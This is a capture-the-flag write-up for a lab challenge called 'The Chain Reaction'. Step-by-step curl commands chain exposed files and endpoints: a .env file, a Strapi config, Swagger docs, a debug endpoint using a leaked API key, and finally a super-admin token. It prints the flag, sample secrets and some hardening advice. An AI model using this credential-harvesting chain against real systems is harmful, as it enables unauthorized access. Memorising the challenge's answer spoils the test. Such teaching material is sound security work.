# 🔗 Kode Labs - The Chain Reaction Writeup

## Challenge Overview
**Name:** The Chain Reaction  
**Category:** Chained Information Disclosure  
**Difficulty:** Medium-Hard  
**Flag:** `STELKCSC{ch41n3d_1nf0_d1scl0sur3_m4st3r}`

## Realistic Tech Stack Leaks

This challenge simulates common real-world misconfigurations:
- `.env` file exposed (development mistake)
- Strapi CMS config files accessible
- Swagger/OpenAPI documentation exposed
- Internal debug endpoints leaking secrets

## Exploitation Chain

```
.env file → Strapi config → Swagger docs → Internal debug → Admin status (FLAG)
```

---

## Step-by-Step Solution

### CHAIN 1: .env File Exposure
```bash
curl http://localhost:5009/.env
```
**Found:**
- AWS credentials (AKIA...)
- Database password
- `INTERNAL_API_KEY=sk_live_51N3xK2LmNoPqRsTuVwXyZ`
- Reference to `/strapi/config/server.js`

### CHAIN 2: Strapi Config File
```bash
curl http://localhost:5009/strapi/config/server.js
```
**Found:** Reference to `/documentation/v1.0.0`

### CHAIN 3: Swagger/OpenAPI Docs
```bash
curl http://localhost:5009/documentation/v1.0.0
```
**Found:** Endpoint `/api/internal/debug` requires `X-Internal-Key` header

### CHAIN 4: Debug Endpoint
```bash
curl http://localhost:5009/api/internal/debug \
  -H "X-Internal-Key: sk_live_51N3xK2LmNoPqRsTuVwXyZ"
```
**Found:** `super_admin_token: sa_prod_eyJhbGciOiJIUzI1NiJ9.YWRtaW4`

### CHAIN 5: Admin Status - GET FLAG
```bash
curl http://localhost:5009/api/internal/admin-status \
  -H "Authorization: Bearer sa_prod_eyJhbGciOiJIUzI1NiJ9.YWRtaW4"
```

## Flag
```
STELKCSC{ch41n3d_1nf0_d1scl0sur3_m4st3r}
```

## Real-World Relevance
- **Never commit .env files** - use .gitignore
- **Disable debug endpoints in production**
- **Restrict access to Swagger docs**
- **Rotate exposed credentials immediately**
